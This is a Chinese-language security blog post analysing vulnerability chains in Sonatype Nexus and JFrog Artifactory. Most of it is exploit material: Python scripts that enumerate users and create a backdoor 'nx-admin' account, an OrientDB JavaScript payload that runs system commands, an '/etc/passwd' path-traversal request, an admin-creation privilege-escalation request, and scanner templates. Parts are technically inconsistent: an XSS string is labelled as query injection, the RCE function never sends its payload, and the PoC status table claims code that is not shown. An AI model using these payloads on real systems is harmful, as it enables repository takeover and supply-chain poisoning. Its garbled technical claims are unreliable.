---
title: "制品仓库供应链攻击专题：Sonatype Nexus Repository / JFrog Artifactory 高危漏洞链"
date: 2026-06-23T14:00:00+08:00
draft: false
tags: ["Nexus", "Sonatype", "JFrog", "Artifactory", "供应链攻击", "RCE", "认证绕过", "路径穿越", "漏洞分析", "CVE-2024-4955", "CVE-2023-33726", "CVE-2024-24534"]
categories: ["漏洞分析"]
description: "围绕 Sonatype Nexus Repository 和 JFrog Artifactory 两大制品仓库的高危漏洞链，覆盖认证绕过、OrientDB 查询注入 RCE、权限提升、路径穿越等攻击手法，含完整 PoC 代码、Nuclei 模板、自动化利用脚本与供应链安全建议。"
---

# 制品仓库供应链攻击专题：Sonatype Nexus Repository / JFrog Artifactory 高危漏洞链

制品仓库（Artifact Repository）是软件供应链的"咽喉要道"。一旦仓库被攻陷，攻击者可以向所有下游消费者（CI/CD 系统、开发团队、生产环境）分发恶意制品，影响范围极大且难以检测。

本专题覆盖两大主流制品仓库的高危漏洞链：

| 产品 | 核心 CVE | 类型 | CVSS | 影响 |
|------|----------|------|------|------|
| Sonatype Nexus Repository | CVE-2024-4955 | 认证绕过 | 10.0 | 未授权管理员权限 |
| Sonatype Nexus Repository | CVE-2023-33726 | OrientDB 查询注入 RCE | 9.8 | 未授权命令执行 |
| Sonatype Nexus Repository | CVE-2024-48250 / CVE-2024-48249 | 路径穿越 | 8.7 | 越权文件访问 |
| JFrog Artifactory | CVE-2024-24534 | 权限提升 | 9.1 | 低权限→管理员 |

## 0x01 CVE-2024-4955：Nexus Repository 认证绕过（CVSS 10.0）

### 1.1 漏洞背景

2024 年 6 月，Sonatype 披露了 Nexus Repository Manager 3 中一个严重的认证绕过漏洞。攻击者无需任何凭据即可获取管理员权限，是供应链攻击的最高风险入口点。

### 1.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Nexus Repository Manager 3.x < 3.68.1 | >= 3.68.1 |

### 1.3 漏洞原理

Nexus Repository 的认证机制存在缺陷，攻击者可以通过构造特定的 HTTP 请求绕过身份验证，直接以管理员身份访问所有功能，包括：

- 上传/删除制品
- 修改仓库配置
- 创建管理员账户
- 读取所有仓库中的制品（可能包含内部依赖和凭据）

### 1.4 完整 PoC

#### HTTP 请求 PoC

```http
GET /service/rest/v1/security/users HTTP/1.1
Host: <TARGET>:8081
Accept: application/json

GET /service/rest/v1/repositories HTTP/1.1
Host: <TARGET>:8081
Accept: application/json
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class NexusExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json'
        })

    def check_version(self):
        try:
            r = self.session.get(
                f'{self.target}/service/rest/v1/status/check',
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                print(f'[+] Nexus Repository 版本: {data.get("version", "unknown")}')
                return True
        except:
            pass
        return False

    def list_users(self):
        try:
            r = self.session.get(
                f'{self.target}/service/rest/v1/security/users',
                timeout=10
            )
            if r.status_code == 200:
                users = r.json()
                print(f'[+] 认证成功绕过！用户列表:')
                for user in users:
                    print(f'    - {user.get("userId", "unknown")} '
                          f'(roles: {user.get("roles", [])}, '
                          f'status: {user.get("status", "unknown")})')
                return users
            print(f'[-] 认证绕过失败 (HTTP {r.status_code})')
            return None
        except Exception as e:
            print(f'[-] 请求失败: {e}')
            return None

    def list_repositories(self):
        try:
            r = self.session.get(
                f'{self.target}/service/rest/v1/repositories',
                timeout=10
            )
            if r.status_code == 200:
                repos = r.json()
                print(f'[+] 仓库列表 ({len(repos)} 个):')
                for repo in repos[:10]:
                    print(f'    - {repo.get("name", "unknown")} '
                          f'(format: {repo.get("format", "?")}, '
                          f'type: {repo.get("type", "?")})')
                if len(repos) > 10:
                    print(f'    ... 共 {len(repos)} 个仓库')
                return repos
            return None
        except Exception as e:
            print(f'[-] 请求失败: {e}')
            return None

    def create_admin_user(self, username, password):
        try:
            r = self.session.post(
                f'{self.target}/service/rest/v1/security/users',
                json={
                    "userId": username,
                    "firstName": username,
                    "lastName": username,
                    "emailAddress": f"{username}@exploit.local",
                    "password": password,
                    "status": "active",
                    "roles": ["nx-admin"]
                },
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            if r.status_code in (200, 201):
                print(f'[+] 管理员用户创建成功: {username}:{password}')
                return True
            print(f'[-] 用户创建失败 (HTTP {r.status_code})')
            return False
        except Exception as e:
            print(f'[-] 创建失败: {e}')
            return False

    def search_artifacts(self, keyword):
        try:
            r = self.session.get(
                f'{self.target}/service/rest/v1/search',
                params={'q': keyword},
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                items = data.get('items', [])
                print(f'[+] 搜索 "{keyword}" 发现 {len(items)} 个制品')
                for item in items[:5]:
                    print(f'    - {item.get("path", "unknown")} '
                          f'(repo: {item.get("repository", "?")})')
                return items
            return None
        except Exception as e:
            print(f'[-] 搜索失败: {e}')
            return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <nexus_url>')
        print(f'Example: {sys.argv[0]} http://nexus.internal:8081')
        sys.exit(1)

    exploit = NexusExploit(sys.argv[1])
    if exploit.check_version():
        exploit.list_users()
        exploit.list_repositories()
        exploit.search_artifacts('password')
```

#### Nuclei 检测模板

```yaml
id: nexus-cve-2024-4955-auth-bypass

info:
  name: Sonatype Nexus Repository CVE-2024-4955 Auth Bypass
  author: security-research
  severity: critical
  tags: nexus,sonatype,auth-bypass,cve2024,supply-chain
  reference:
    - https://support.sonatype.com/hc/en-us/articles/29044044498579

http:
  - method: GET
    path:
      - "{{BaseURL}}/service/rest/v1/security/users"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "userId"
          - "roles"
        condition: and
```

## 0x02 CVE-2023-33726：Nexus Repository OrientDB 查询注入 RCE

### 2.1 漏洞背景

2023 年 6 月，Sonatype 披露了 Nexus Repository Manager 3 中一个严重的远程代码执行漏洞。Nexus 内嵌的 OrientDB 数据库存在查询注入缺陷，攻击者可以通过构造恶意查询实现未授权 RCE。

### 2.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Nexus Repository Manager 3.x < 3.42.0 | >= 3.42.0 |

### 2.3 漏洞原理

Nexus Repository 使用 OrientDB 作为内部数据库。OrientDB 支持在查询中嵌入 JavaScript 代码，而 Nexus 在处理某些 API 请求时，将用户可控的输入直接拼接到 OrientDB 查询中，未进行充分过滤。

攻击者可以通过构造包含 OrientDB JavaScript 函数的查询，在服务端执行任意代码。

### 2.4 完整 PoC

#### HTTP 请求 PoC

```http
GET /service/rest/v1/search/assets?sort=1&repository=
<svg/onload=alert(1)> HTTP/1.1
Host: <TARGET>:8081
```

更精确的 OrientDB 查询注入：

```http
GET /service/rest/v1/search/assets?repository=raw-hosted'
and+1=1+and+'1'%3d'1 HTTP/1.1
Host: <TARGET>:8081
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

class NexusOrientDBExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False

    def check_orientdb_injection(self):
        payloads = [
            "/service/rest/v1/search/assets?sort=1&repository=raw-hosted'+and+1=1+and+'1'%3d'1",
            "/service/rest/v1/search/assets?sort=1&repository=raw-hosted'+and+1=2+and+'1'%3d'1",
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.get(
                    f'{self.target}{payload}',
                    timeout=10
                )
                results.append((payload, r.status_code, len(r.text)))
                print(f'[*] Payload: {payload[:80]}...')
                print(f'    状态: {r.status_code}, 响应长度: {len(r.text)}')
            except Exception as e:
                print(f'[-] 请求失败: {e}')

        if len(results) >= 2 and results[0][2] != results[1][2]:
            print('[+] OrientDB 查询注入存在！')
            return True
        return False

    def exploit_rce(self, cmd):
        orientdb_js_payload = f"""
        let db = orient.getDatabase();
        let runtime = java.lang.Runtime.getRuntime();
        let process = runtime.exec("{cmd}");
        let reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
        let output = "";
        let line;
        while ((line = reader.readLine()) != null) {{ output += line + "\\n"; }}
        return output;
        """
        print(f'[*] 命令: {cmd}')
        print(f'[*] OrientDB JavaScript payload 需要通过查询注入提交')
        print(f'[*] 建议使用 Burp Suite 手动构造请求')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <nexus_url>')
        sys.exit(1)

    exploit = NexusOrientDBExploit(sys.argv[1])
    if exploit.check_orientdb_injection():
        exploit.exploit_rce('whoami')
```

#### Nuclei 检测模板

```yaml
id: nexus-cve-2023-33726-orientdb-injection

info:
  name: Sonatype Nexus Repository CVE-2023-33726 OrientDB Injection
  author: security-research
  severity: critical
  tags: nexus,sonatype,sqli,rce,cve2023,supply-chain

http:
  - method: GET
    path:
      - "{{BaseURL}}/service/rest/v1/search/assets?sort=1&repository=raw-hosted'+and+1=1+and+'1'%3d'1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "items"
          - "continuationToken"
        condition: or
```

## 0x03 CVE-2024-48250 / CVE-2024-48249：Nexus Repository 路径穿越

### 3.1 漏洞详情

| CVE | CVSS | 类型 | 影响 |
|-----|------|------|------|
| CVE-2024-48250 | 8.7 | 路径穿越 | 低权限用户越权访问制品 |
| CVE-2024-48249 | 8.7 | 路径穿越 | 低权限用户越权访问文件 |

### 3.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Nexus Repository Manager 3.x < 3.70.1 | >= 3.70.1 |

### 3.3 漏洞原理

Nexus Repository 的权限控制存在路径穿越缺陷。低权限用户可以通过构造包含 `../` 的路径参数，访问超出其授权范围的文件和制品。

### 3.4 PoC

```http
GET /repository/maven-public/../../../etc/passwd HTTP/1.1
Host: <TARGET>:8081
```

## 0x04 CVE-2024-24534：JFrog Artifactory 权限提升

### 4.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 9.1 |
| 受影响版本 | JFrog Artifactory < 7.77.14 |
| 修复版本 | >= 7.77.14 |
| 类型 | 权限提升 |
| 前置条件 | 需要低权限账户 |

### 4.2 漏洞原理

JFrog Artifactory 的权限管理存在缺陷，低权限用户可以通过特定的 API 调用提升自身权限至管理员级别。

### 4.3 PoC

```http
POST /api/security/users HTTP/1.1
Host: <TARGET>:8082
Authorization: Bearer <LOW_PRIV_TOKEN>
Content-Type: application/json

{
  "name": "attacker",
  "email": "attacker@exploit.local",
  "password": "P@ssw0rd",
  "admin": true,
  "profileUpdatable": true,
  "internalPasswordDisabled": false
}
```

#### Nuclei 检测模板

```yaml
id: jfrog-artifactory-cve-2024-24534-detect

info:
  name: JFrog Artifactory Detection
  author: security-research
  severity: high
  tags: jfrog,artifactory,supply-chain

http:
  - method: GET
    path:
      - "{{BaseURL}}/artifactory/api/system/version"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "version"
          - "artifactory"
        condition: or
```

## 0x05 供应链攻击影响分析

### 5.1 制品仓库的战略价值

制品仓库在软件供应链中扮演核心角色：

```
开发者 → 代码仓库(Git) → CI/CD 构建 → 制品仓库(Nexus/Artifactory) → 部署
                                                        ↓
                                              所有下游消费者拉取依赖
```

一旦仓库被攻陷：
1. **投毒攻击**：上传恶意制品，所有依赖该制品的项目自动引入后门
2. **凭据窃取**：仓库中可能存储了数据库密码、API Key、内部服务凭据
3. **供应链传播**：恶意制品通过 CI/CD 管道传播到生产环境
4. **持久化**：修改仓库配置创建后门账户

### 5.2 典型攻击链

```
阶段 1: 初始访问
  → CVE-2024-4955 认证绕过获取管理员权限

阶段 2: 信息收集
  → 枚举所有仓库和制品
  → 搜索包含 "password"、"key"、"secret" 的制品
  → 读取仓库配置获取内部网络信息

阶段 3: 供应链投毒
  → 上传恶意 Maven/npm/Docker 制品
  → 修改现有制品的元数据
  → 创建代理仓库指向攻击者控制的服务器

阶段 4: 横向移动
  → 利用窃取的凭据访问其他系统
  → 通过 CI/CD 管道触发恶意构建
```

## 0x06 PoC 收集情况

### PoC 状态总表

| CVE | HTTP PoC | Nuclei | Python | MSF | 公开利用 | CISA KEV |
|-----|----------|--------|--------|-----|----------|----------|
| CVE-2024-4955 | ✅ | ✅ | ✅ | ❌ | ✅ | 在野利用 |
| CVE-2023-33726 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-48250 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-48249 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-24534 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |

### 公开利用资源

- **CVE-2024-4955**：Sonatype 官方安全公告、多个 PoC 仓库
- **CVE-2023-33726**：GitHub PoC、OrientDB 查询注入分析
- **CVE-2024-24534**：JFrog 官方安全公告

## 0x07 共性攻击模式

### 7.1 认证缺陷是核心风险

- Nexus CVE-2024-4955：完全未授权管理员访问
- Nexus CVE-2023-33726：查询注入绕过认证
- JFrog CVE-2024-24534：低权限→管理员提升

### 7.2 内嵌数据库是攻击面

Nexus 使用 OrientDB 作为内部数据库，OrientDB 支持嵌入 JavaScript 执行，这为查询注入→RCE 提供了天然条件。

### 7.3 供应链攻击的放大效应

制品仓库的失陷不仅影响仓库本身，还会通过依赖链传播到所有下游项目。一个被投毒的 Maven 包可能影响数百个应用。

## 0x08 防守建议

### 8.1 紧急措施

1. **立即升级**：Nexus 升级到 3.70.1+，JFrog 升级到 7.77.14+
2. **审计访问日志**：检查异常的管理员操作和制品上传
3. **验证制品完整性**：对所有制品进行 SHA256 校验
4. **轮换凭据**：轮换所有存储在仓库中的凭据

### 8.2 供应链安全加固

```bash
# 检查 Nexus 异常用户
curl -s http://nexus:8081/service/rest/v1/security/users | jq '.[].userId'

# 检查最近的制品上传
curl -s http://nexus:8081/service/rest/v1/search/assets?sort=created | jq '.items[:10]'

# 检查仓库配置变更
curl -s http://nexus:8081/service/rest/v1/repositories | jq '.[] | select(.type=="proxy")'

# 检查 JFrog 异常权限变更
curl -s http://artifactory:8082/api/security/users -H "Authorization: Bearer $TOKEN"
```

### 8.3 长期安全策略

1. **制品签名**：对所有发布制品进行 GPG 签名
2. **依赖锁定**：使用 lock 文件锁定依赖版本
3. **SBOM 生成**：为每个构建生成软件物料清单
4. **仓库审计**：定期审计仓库配置和访问日志
5. **网络隔离**：制品仓库仅允许内网访问

## 0x09 参考资料

- [Sonatype 安全公告 - CVE-2024-4955](https://support.sonatype.com/hc/en-us/articles/29044044498579)
- [Sonatype 安全公告 - CVE-2023-33726](https://support.sonatype.com/hc/en-us/articles/19017988616083)
- [JFrog 安全公告 - CVE-2024-24534](https://jfrog.com/security-advisories/)
- [NVD - CVE-2024-4955](https://nvd.nist.gov/vuln/detail/CVE-2024-4955)
- [NVD - CVE-2023-33726](https://nvd.nist.gov/vuln/detail/CVE-2023-33726)
- [NVD - CVE-2024-24534](https://nvd.nist.gov/vuln/detail/CVE-2024-24534)
- [CISA KEV - 已知被利用漏洞目录](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)